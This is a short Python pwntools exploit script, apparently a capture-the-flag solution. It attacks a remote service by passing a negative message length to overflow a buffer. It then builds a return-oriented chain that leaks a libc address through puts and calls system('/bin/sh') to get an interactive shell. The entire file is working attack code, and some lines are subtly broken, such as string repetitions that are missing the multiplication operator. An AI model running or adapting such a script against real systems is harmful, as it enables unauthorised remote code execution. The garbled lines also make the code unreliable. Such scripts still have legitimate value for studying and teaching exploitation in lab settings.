from pwn import *
r = remote('54.225.38.91', 1027)
  # gdb.attach(r)
r.sendlineafter('Please provide your message length:', str(-1))
r.sendlineafter('Please provide your ID:', str(1)+str(-1))
  # r.send('\n')
  # payload = 'a'0x60
payload = "\xff"*120
poprdi = 0x400a93
poprsir15 = 0x400a91
mainf = 0x400897
puts_plt = 0x400700
read_plt = 0x400730
read_got = 0x601030
payload += p64(poprdi)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(mainf)
  # gdb.attach(r, 'b * 0x00000000004008d5')
r.sendafter('Thank you, now please provide your message:', payload)
r.recvuntil("Goodbye!\n")
leak = r.recvline().strip()
read_libc = u64(leak+"\x00"(8-len(leak)))
print hex(read_libc)
'''libc_base = read_libc - 0xf7250
system = libc_base + 0x45390
binsh = libc_base + 0x18cd57'''
'''
r.sendlineafter('Please provide your message length:',str(9))
r.sendlineafter('Please provide your ID:',str(12))
r.sendlineafter('Thank you, now please provide your message:','l')
print(r.recvline())'''
libc_base = read_libc - 0x111260
print(hex(libc_base))
system = libc_base + 0x554e0
print(hex(system))
binsh = libc_base + 0x1b6613
print(binsh)
r.sendlineafter('Please provide your message length:', str(-1))
r.sendafter('Please provide your ID:', str(1))
payload = 'B'120
payload += p64(poprdi)
payload += p64(binsh)
payload += p64(system)
payload += p64(0x0000000000400a28)
r.sendlineafter('Thank you, now please provide your message:', payload)
r.interactive()
